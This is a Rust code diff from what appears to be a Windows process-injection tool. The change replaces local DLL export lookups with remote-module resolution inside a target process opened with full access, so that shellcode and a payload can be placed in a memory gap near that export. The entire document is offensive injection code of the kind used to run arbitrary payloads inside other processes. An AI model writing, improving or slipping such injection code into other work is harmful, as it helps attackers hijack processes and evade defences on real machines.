@@ -13,7 +13,7 @@ use clap::Parser;
 
 use std::time::Instant;
 use memory;
-
+use remote_modules;
 
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
@@ -92,16 +92,15 @@ fn main() -> Result<(), String> {
     
     unsafe{
     
-    let hmodule = match LibraryLoader::GetModuleHandleA(PCSTR(format!("{}\0", &args.dll).as_mut_ptr())){
-        Ok(x) => x,
-        Err(_) => return Err(format!("Failed to open handle to DLL {}", &args.dll))
-    };
+    // let hmodule = match LibraryLoader::GetModuleHandleA(PCSTR(format!("{}\0", &args.dll).as_mut_ptr())){
+    //     Ok(x) => x,
+    //     Err(_) => return Err(format!("Failed to open handle to DLL {}", &args.dll))
+    // };
     
-    let export_address: usize = match LibraryLoader::GetProcAddress(hmodule, PCSTR(format!("{}\0", &args.export).as_mut_ptr())){
-        Some(x) =>  std::mem::transmute::<unsafe extern "system" fn() -> isize, usize>(x),
-        None => return Err(format!("Failed to find export {} in dll {}", &args.export, &args.dll)),
-    };
-    println!("[*] Found {}!{} at @{:x}", &args.dll, &args.export, export_address);
+    // let export_address: usize = match LibraryLoader::GetProcAddress(hmodule, PCSTR(format!("{}\0", &args.export).as_mut_ptr())){
+    //     Some(x) =>  std::mem::transmute::<unsafe extern "system" fn() -> isize, usize>(x),
+    //     None => return Err(format!("Failed to find export {} in dll {}", &args.export, &args.dll)),
+    // };
 
     let target_process_handle = match Threading::OpenProcess(Threading::PROCESS_ALL_ACCESS, false, args.pid){
         Ok(x) => x,
@@ -109,6 +108,12 @@ fn main() -> Result<(), String> {
     };
 
     println!("[*] Opened process with pid {}", &args.pid);
+
+    let hmodule = remote_modules::get_remote_module_handle(target_process_handle, args.dll.clone()).unwrap();
+    let export_address = remote_modules::get_remote_proc_address(target_process_handle, hmodule, args.export.clone(), 0, false).unwrap();
+
+    println!("[*] Found {}!{} at @{:x}", &args.dll, &args.export, export_address);
+
     
     let loader_address = match find_memory_hole(target_process_handle, export_address, shellcode.len() + payload.len()){
         Ok(x) => x,
